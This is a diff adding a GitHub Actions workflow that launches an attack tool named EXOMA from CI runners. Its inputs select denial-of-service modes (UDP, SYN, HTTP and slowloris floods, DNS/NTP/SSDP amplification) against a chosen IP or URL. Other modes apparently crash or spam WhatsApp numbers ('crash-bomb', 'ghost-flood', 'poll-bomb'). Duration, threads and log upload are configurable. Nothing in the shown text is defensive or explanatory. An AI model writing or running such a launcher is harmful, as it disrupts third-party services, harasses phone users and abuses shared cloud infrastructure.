@@ -1,0 +1,69 @@
+name: EXOMA V1 Run
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+    inputs:
+      attack_type:
+        description: "wa | ddos"
+        required: true
+        default: "ddos"
+      mode:
+        description: "WA: crash-bomb|bug-total|ghost-flood|mirror-spam|sticker-storm|reaction-raid|poll-bomb|vcard-hurricane|exoma-ultra | DDoS: udp|syn|http|slowloris|amp-dns|amp-ntp|amp-ssdp"
+        required: true
+        default: "udp"
+      target:
+        description: "WA: 62xxx | DDoS: ip/url"
+        required: true
+        default: "1.1.1.1"
+      port:
+        description: "port (DDoS L4)"
+        required: false
+        default: "80"
+      duration:
+        description: "durasi detik"
+        required: false
+        default: "60"
+      threads:
+        description: "threads / rate"
+        required: false
+        default: "200"
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: "20" }
+      - run: npm install --no-audit --no-fund
+
+      - name: Run DDoS
+        if: ${{ github.event.inputs.attack_type == 'ddos' }}
+        env:
+          EXOMA_DDOS_MODE: ${{ github.event.inputs.mode }}
+          EXOMA_DDOS_TARGET: ${{ github.event.inputs.target }}
+          EXOMA_DDOS_PORT: ${{ github.event.inputs.port }}
+          EXOMA_DDOS_DURATION: ${{ github.event.inputs.duration }}
+          EXOMA_DDOS_THREADS: ${{ github.event.inputs.threads }}
+        run: node exoma.js
+        continue-on-error: true
+
+      - name: Run WA
+        if: ${{ github.event.inputs.attack_type == 'wa' }}
+        env:
+          EXOMA_MODE: ${{ github.event.inputs.mode }}
+          EXOMA_TARGET: ${{ github.event.inputs.target }}
+          EXOMA_JUMLAH: ${{ github.event.inputs.threads }}
+          EXOMA_AUTORUN: "1"
+        run: node exoma.js
+        continue-on-error: true
+
+      - if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: exoma-logs
+          path: logs/
+          if-no-files-found: ignore
